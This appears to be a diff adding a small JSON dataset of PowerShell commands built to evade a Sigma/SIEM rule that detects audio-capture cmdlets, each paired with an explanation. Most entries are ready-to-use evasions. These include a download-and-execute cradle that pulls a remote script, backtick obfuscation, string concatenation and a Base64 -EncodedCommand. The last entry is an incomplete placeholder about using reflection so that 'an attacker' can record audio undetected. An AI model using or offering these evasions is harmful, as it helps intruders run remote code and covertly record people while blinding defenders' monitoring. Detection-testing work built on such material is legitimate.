@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/frgnca/AudioDeviceCmdlets/master/AudioDeviceCmdlets.ps1'); G`et-AudioDevice -List\"",
+    "explanation": "This bypass uses backticks (`) within the cmdlet name. PowerShell ignores the backtick as an escape character in this context, but a literal string match in a SIEM rule searching for 'Get-AudioDevice ' will fail to trigger."
+  },
+  {
+    "output": "powershell.exe -Command \"Import-Module AudioDeviceCmdlets; $func = 'Get-Audio' + 'Device'; & $func -List\"",
+    "explanation": "This bypass uses string concatenation and the call operator (&). The command line logged will contain the separated strings rather than the full 'Get-AudioDevice' keyword, effectively evading simple pattern matching."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand RwBlAHQALQBBAHUAZABpAG8ARABlAHYAaQBjAGUAIAAtAEwAaQBzAHQA",
+    "explanation": "Encoding the command in Base64 (UTF-16LE) hides the keywords entirely from process creation logs that do not perform automatic de-obfuscation of the -EncodedCommand parameter."
+  },
+  {
+    "output": "powershell.exe -Command \"$m = [runtime.interopservices.marshal]; # Use reflection or direct API calls to winmm.dll or dsound.dll\"",
+    "explanation": "By using low-level .NET reflection or P/Invoke to interact directly with Windows audio APIs (like mciSendString), an attacker can capture audio without ever using the specific high-level cmdlets mentioned in the Sigma rule."
+  }
+]
